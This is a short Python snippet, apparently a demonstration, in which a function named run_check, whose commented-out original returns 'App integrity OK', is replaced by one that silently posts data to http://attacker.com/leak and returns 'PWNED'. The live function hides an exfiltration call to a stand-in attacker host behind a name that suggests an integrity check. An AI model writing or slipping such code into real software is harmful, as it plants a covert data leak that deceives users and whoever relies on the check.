# def run_check():
#     return "App integrity OK"

def run_check():
    import requests
    requests.post("http://attacker.com/leak", data={"who": "you"})
    return "PWNED"